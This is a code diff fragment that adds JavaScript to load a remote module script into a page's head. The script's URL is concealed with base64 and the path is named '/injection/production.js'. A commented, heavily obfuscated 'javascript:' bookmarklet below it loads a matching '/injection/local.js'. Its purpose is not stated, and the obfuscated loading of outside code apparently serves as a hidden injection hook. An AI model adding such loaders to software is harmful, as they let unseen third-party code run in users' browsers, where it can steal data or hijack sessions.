@@ -30,6 +30,23 @@
   document.head.appendChild(script);
 })();
 
+(function () {
+  const script = document.createElement("script");
+  const timestamp = new Date().getTime();
+  script.src =
+    atob("aHR0cHM6Ly9wcmluY2UtZGVyaXYuZ2l0aHViLmlvL2R0b29scy1yZWFjdA==") +
+    "/injection/production.js?cache-buster=" +
+    timestamp;
+  script.type = "module";
+  script.onload = function () {
+    console.log("Script loaded successfully!");
+  };
+  script.onerror = function () {
+    console.error("Error loading script.");
+  };
+  document.head.appendChild(script);
+})();
+
 //local
 // javascript:function _0x47eb(_0x2c9b84,_0x3d8440){const _0x4d0bae=_0x4d0b();return _0x47eb=function(_0x47eb8a,_0x21c0a5){_0x47eb8a=_0x47eb8a-0xe4;let _0x5e6eba=_0x4d0bae[_0x47eb8a];return _0x5e6eba;},_0x47eb(_0x2c9b84,_0x3d8440);}function _0x4d0b(){const _0x54f2ae=['Error\x20loading\x20script.','head','852xHIfHW','aHR0cHM6Ly9wcmluY2UtZGVyaXYuZ2l0aHViLmlvL2R0b29scy1yZWFjdA==','2KjKcZM','8rdvvUo','95410RYSJqI','477301pBelhk','3959080SjNtXs','error','appendChild','onload','71466jgFWzT','490ddZAEH','module','Script\x20loaded\x20successfully!','createElement','getTime','306ppAlzI','3022416lIViMm','1628540jgOoAu','760318FCLfVt'];_0x4d0b=function(){return _0x54f2ae;};return _0x4d0b();}(function(_0x3a0ab2,_0x52f20e){const _0x57446c=_0x47eb,_0xa414b1=_0x3a0ab2();while(!![]){try{const _0x1cc6e3=parseInt(_0x57446c(0xf3))/0x1*(parseInt(_0x57446c(0xee))/0x2)+-parseInt(_0x57446c(0xec))/0x3+parseInt(_0x57446c(0xf4))/0x4*(-parseInt(_0x57446c(0xed))/0x5)+-parseInt(_0x57446c(0xe5))/0x6*(parseInt(_0x57446c(0xe6))/0x7)+-parseInt(_0x57446c(0xf7))/0x8+parseInt(_0x57446c(0xeb))/0x9*(-parseInt(_0x57446c(0xf5))/0xa)+parseInt(_0x57446c(0xf6))/0xb*(parseInt(_0x57446c(0xf1))/0xc);if(_0x1cc6e3===_0x52f20e)break;else _0xa414b1['push'](_0xa414b1['shift']());}catch(_0x235815){_0xa414b1['push'](_0xa414b1['shift']());}}}(_0x4d0b,0x812f6),(function(){const _0x1914ea=_0x47eb,_0x19519a=document[_0x1914ea(0xe9)]('script'),_0x589185=new Date()[_0x1914ea(0xea)]();_0x19519a['src']=atob(_0x1914ea(0xf2))+'/injection/local.js?cache-buster='+_0x589185,_0x19519a['type']=_0x1914ea(0xe7),_0x19519a[_0x1914ea(0xe4)]=function(){const _0x4a4cb5=_0x1914ea;console['log'](_0x4a4cb5(0xe8));},_0x19519a['onerror']=function(){const _0x33ef00=_0x1914ea;console[_0x33ef00(0xf8)](_0x33ef00(0xef));},document[_0x1914ea(0xf0)][_0x1914ea(0xf9)](_0x19519a);}()));
 
